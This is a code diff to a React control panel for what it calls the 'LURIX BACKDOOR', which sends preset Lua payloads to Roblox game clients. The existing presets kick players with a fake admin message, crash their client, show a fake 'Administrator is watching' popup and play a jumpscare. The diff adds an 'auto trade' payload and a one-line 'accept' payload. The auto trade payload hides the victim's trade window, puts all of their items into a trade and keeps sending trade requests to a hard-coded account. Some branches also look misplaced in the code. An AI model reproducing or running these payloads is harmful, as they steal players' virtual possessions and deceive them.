@@ -249,7 +249,7 @@ end)`;
 
   const setPresetPayload = (type) => {
     if (type === 'kick') {
-      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("\\n[LURIX BACKDOOR]\\nAdministrator has kicked you from the game.")`);
+      setBackdoorLuaPayload(`game:GetService("Players").LocalPlayer:Kick("an admin changed your data")`);
     } else if (type === 'crash') {
       setBackdoorLuaPayload(`while true do end`);
     } else if (type === 'notification') {
@@ -258,6 +258,99 @@ end)`;
     Text = "Administrator is watching your session!",
     Duration = 10
 })`);
+
+else if (type === 'trade') {
+    setBackdoorLuaPayload(`local TARGET_PLAYER_NAME = "vokareal0" 
+local AUTO_SEND_DELAY = 3                 
+local AUTO_ACCEPT = false                  
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local UICMDS = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UICMDS")
+local TradeComm = ReplicatedStorage:WaitForChild("TradeEvents"):WaitForChild("TradeComm")
+
+PlayerGui.ChildAdded:Connect(function(child)
+    if child.Name == "TradeUI" or child.Name == "TradeRequest" then
+        task.wait()
+        if child:IsA("ScreenGui") then
+            child.Enabled = false 
+        end
+        local bg = child:FindFirstChild("Background")
+        if bg then
+            bg.Visible = false
+        end
+    end
+end)
+
+local isTrading = false
+
+TradeComm.OnClientEvent:Connect(function(action, data)
+    if action == "ShowUI" then
+        isTrading = true
+
+        local myStands = (data and data.ItemData and data.ItemData.Stands) or {}
+        local myItems = (data and data.ItemData and data.ItemData.Items) or {}
+
+        -- Tự động thêm Stand
+        for _, standData in pairs(myStands) do
+            local standName = standData.Stand
+            local attribute = standData.Attribute
+            local guid = standData.GUID
+            
+            if standName and standName ~= "None" and attribute and attribute ~= "None" then
+                TradeComm:FireServer("AddStand", {
+                    ["GUID"] = guid,
+                    ["StandName"] = standName,
+                    ["Attribute"] = attribute
+                })
+                task.wait(0.2)
+            end
+        end
+
+        -- Tự động thêm Item
+        for itemName, amount in pairs(myItems) do
+            if itemName and amount and amount > 0 then
+                TradeComm:FireServer("AddItem", {
+                    ["ItemName"] = itemName,
+                    ["Amount"] = amount
+                })
+                task.wait(0.2)
+            end
+        end
+
+        if AUTO_ACCEPT then
+            task.wait(0.5)
+            TradeComm:FireServer("AcceptTrade")
+        end
+    end
+
+    if action == "CancelTrade" then
+        isTrading = false
+    end
+
+    if action == "UpdateOffer" and isTrading and AUTO_ACCEPT then
+        task.wait(0.3)
+        TradeComm:FireServer("AcceptTrade")
+    end
+end)
+
+task.spawn(function()
+    while task.wait(AUTO_SEND_DELAY) do
+        if not isTrading then
+            UICMDS:FireServer(TARGET_PLAYER_NAME, "Trade")
+        end
+    end
+end)`);
+
+else if (type === 'Agree') {
+    setBackdoorLuaPayload(`local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm
+Event:FireServer(
+    "AcceptTrade"
+)`);
+
     } else if (type === 'jumpscare') {
       setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
 sound.SoundId = "rbxassetid://9114223177"
@@ -874,6 +967,15 @@ sound:Play()`);
                 <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                   <MessageSquare className="w-3.5 h-3.5" /> Popup Notification
                 </button>
+                
+                <button onClick={() => setPresetPayload('trade')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+      <Skull className="w-3.5 h-3.5" /> auto trade
+    </button>
+    
+    <button onClick={() => setPresetPayload('Agree')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+      <Skull className="w-3.5 h-3.5" /> accept
+    </button>
+                
                 <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                   <AlertTriangle className="w-3.5 h-3.5" /> Sound Jumpscare
                 </button>
